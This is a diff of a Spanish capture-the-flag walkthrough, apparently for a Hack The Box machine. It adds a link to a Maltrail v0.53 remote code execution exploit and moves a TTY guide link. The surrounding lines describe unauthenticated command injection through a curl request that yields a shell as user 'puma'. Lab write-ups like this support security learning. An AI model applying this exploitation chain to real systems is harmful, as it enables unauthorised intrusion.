@@ -117,7 +117,7 @@ http://10.129.229.26:55555/mybasket/
 
 ### 4.3 Unauthenticated Command Injection (Maltrail)
 
-Maltrail expone un endpoint vulnerable a **inyección de comandos sin autenticación**, lo que permite ejecutar comandos arbitrarios en el sistema.
+Maltrail expone un endpoint vulnerable a **[inyección de comandos sin autenticación](https://github.com/apaz-dev/Maltrail-v0.53-RCE)**, lo que permite ejecutar comandos arbitrarios en el sistema.
 
 Para verificar la ejecución remota de comandos, se levanta un servidor HTTP local:
 
@@ -159,7 +159,7 @@ curl "http://10.129.229.26:55555/mybasket/login" \
 ```
 
 Se recibe una conexión entrante, obteniendo acceso como el usuario **puma**.  
-Para mejorar la estabilidad de la shell, puede transformarse en una TTY interactiva siguiendo la guía: **[TTY Interactiva](/toolbox/tty-interactiva)**.
+Para mejorar la estabilidad de la shell, puede transformarse en una TTY interactiva siguiendo la guía: **[TTY Interactiva](/post-exploitation/linux/tty-interactiva)**.
 
 ```bash
 id
